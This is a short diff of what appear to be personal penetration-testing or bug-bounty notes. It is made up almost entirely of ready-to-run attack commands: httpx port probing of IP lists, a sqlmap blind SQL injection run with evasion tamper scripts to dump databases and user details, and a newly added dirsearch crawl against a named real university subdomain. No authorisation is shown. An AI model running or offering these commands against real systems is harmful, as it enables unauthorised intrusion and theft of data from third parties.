@@ -23,3 +23,7 @@ cat ips_84_21.txt ips_212_9_180.txt | sort -u   | httpx -ports "80,443,8080,8000
 
 
 $ sqlmap -r reound.txt  --flush-session --dbs --banner --current-user --dbms=mysql --technique=BT  --time-sec=5 --level=3 --risk=2  --tamper=space2comment,randomcase --batch --threads=2 -v 3 --ignore-code 401
+
+deep fuzz 
+
+└─$ dirsearch -u https://dev.astro.monash.edu/ -t 10 --deep-recursive  --crawl --full-url
